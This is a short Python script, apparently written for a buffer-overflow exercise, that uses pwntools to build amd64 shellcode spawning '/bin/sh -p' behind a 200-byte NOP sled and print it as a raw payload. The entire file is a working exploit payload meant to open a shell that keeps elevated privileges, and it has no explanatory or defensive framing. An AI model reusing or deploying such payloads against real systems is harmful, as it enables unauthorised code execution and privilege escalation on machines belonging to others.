from pwn import *


context.arch = 'amd64'
shellcode = asm(shellcraft.execve('/bin/sh', ['/bin/sh', '-p'], 0))
payload = b'\x90' * 200 + shellcode

import sys
sys.stdout.buffer.write(payload)